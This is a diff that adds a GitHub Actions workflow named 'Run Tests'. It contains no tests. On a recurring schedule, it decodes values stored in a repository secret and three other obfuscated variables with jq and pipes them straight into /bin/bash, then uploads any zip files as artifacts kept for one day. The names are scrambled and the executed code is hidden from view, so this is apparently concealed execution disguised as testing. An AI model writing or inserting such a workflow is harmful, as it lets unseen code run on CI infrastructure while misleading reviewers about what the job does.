@@ -1,0 +1,29 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '59 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          sukmk6822: ${{ secrets.sukmk6822 }}
+        run: |
+          printf '%s' "$sukmk6822" | jq -r .uv4011 | /bin/bash
+          printf '%s' "$tzz123" | jq -r .s7949 | /bin/bash
+          echo $kphc68877 | jq -r .mr240 | /bin/bash
+          printf '%s' "$dzjda73247" | jq -r .r08083 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: QpFQ5ncw
+          path: "*.zip"
+          retention-days: 1
